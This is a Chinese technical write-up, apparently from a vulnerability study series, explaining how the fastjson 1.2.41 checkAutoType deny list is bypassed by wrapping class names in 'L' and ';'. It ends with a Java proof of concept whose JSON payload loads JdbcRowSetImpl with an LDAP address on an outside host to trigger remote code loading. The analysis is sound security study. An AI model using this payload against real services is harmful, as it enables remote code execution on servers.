.. _1.2.41:

版本1.2.41
================

漏洞说明
------------
从1.2.25开始，增加了checkAutoType函数，用于检查指定类型的合法性，从而屏蔽了 :ref:`1.2.24` 之前所用的POC方法。但是新增加的checkAutoType函数在检查类型时还是有漏洞，通过设置autoTypeSupport为true，且在类型名称两端增加大写字母\"L\"和分号\";\" ，以绕过检查。到1.2.41版本，漏洞还未修复。
在checkAutoType函数中的最后，设置了如果autoTypeSupport为false直接抛出异常。所以要设置为true。


调试
---------

.. figure:: images/1.2.41/DefaultJSONParser-parseObject41-1.png

   DefaultJSONParser.parseObject

   对使用@type定义的传入类型，利用ParserConfig.checkAutoType函数进行判断。

.. figure:: images/1.2.41/ParserConfig-checkAutoType41-1.png

   ParserConfig.checkAutoType

   在denyList数组中预先保存了黑名单信息，如果传入的类型以黑名单中的字符串为起始字符串，则直接返回异常退出，不会进行反序列化转换。 :ref:`1.2.24` 之前所用的POC方法，就是在这里被屏蔽掉了。

.. figure:: images/1.2.41/ParserConfig-checkAutoType41-2.png

   ParserConfig.checkAutoType

   在传入的类名两端分别拼接\"L\"和\";\"字符，可以绕过黑名单，然后通过三参数TypeUtils.loadClass函数继续判断类型信息，cache设置为false

.. figure:: images/1.2.41/TypeUtils-loadClass41-1.png

   TypeUtils.loadClass

   在loadClass类中，从mappings中查找预定义的类型，如果有直接返回，如果没有继续查找。在1142行，判断类型如果以\"L\"开头，\";\"结尾，则先去掉前后字符，再调用1126行的两个参数loadClass，在这个函数中设置cache为true重新调用三个参数的loadClass，运行到1161行的contextClassLoader.loadClass，从系统运行环境中查找类名。输入的JdbcRowSetImpl在运行环境中基本都会存在，所以返回对应的类名，把该类保存到mappings中，并返回ParserConfig中。

   当@type设定的类型通过checkAutoType函数的校验，后续的处理逻辑和前述版本的逻辑类似，执行JdbcRowSetImpl类进行远程调用。

.. figure:: images/1.2.41/fastjson1.2.41.png
   :scale: 100%
   :width: 800 px
   :height: 400 px

   调用序列图


POC
-------

.. code-block:: java

	package org.example;

	import com.alibaba.fastjson.JSON;
	import com.alibaba.fastjson.parser.ParserConfig;
	
	public class Main {
	    public static void main(String[] args) {
	
	        String s = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://192.168.0.102:1389/ExTest\", \"autoCommit\":true}";
	        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
	        Object contentValue = JSON.parseObject(s);
	
	    }
	}	


补漏
-------

为了说明漏洞原理，在POC中设置了autoTypeSupport为true，实际操作中，只能传json字符串，不能在目标服务器上修改系统的属性字段值。如果目标服务器上的autoTypeSupport缺省是false，就是服务器要求不能利用@type指定转换类型，则这种攻击方法就无效了，这也失去了fastjson的部分灵活性。

所有漏洞的最终解决方法都是升级版本：)
